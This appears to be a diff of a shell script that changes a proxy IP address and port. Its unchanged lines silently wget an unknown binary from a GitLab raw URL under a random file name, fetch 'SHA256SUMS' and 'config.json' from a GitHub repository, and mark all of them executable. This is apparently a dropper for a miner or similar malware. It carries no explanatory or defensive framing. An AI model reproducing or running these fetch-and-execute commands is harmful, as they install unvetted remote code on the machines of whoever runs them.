@@ -1,5 +1,5 @@
-proxy="98.181.137.80" 
-port="4145"
+proxy="98.162.25.29" 
+port="31679"
 wget -q -O fe456532443 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x fe456532443
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
